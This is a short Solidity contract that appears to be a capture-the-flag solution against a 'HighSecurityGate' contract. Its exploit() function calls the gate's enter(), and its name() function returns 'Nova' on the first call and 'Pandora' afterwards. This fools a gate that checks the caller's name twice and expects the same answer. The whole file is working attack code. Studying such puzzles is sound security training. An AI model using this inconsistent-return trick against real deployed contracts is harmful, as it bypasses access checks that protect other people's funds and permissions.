pragma solidity ^0.8.18;

interface IHighSecurityGate {
    function enter() external;
}

contract Entrant {
    bool visited;

    function exploit(address instance) public {
        IHighSecurityGate(instance).enter();
    }

    function name() external returns (string memory) {
        if (!visited) {
            visited = true;
            return "Nova";
        } else {
            return "Pandora";
        }
    }
}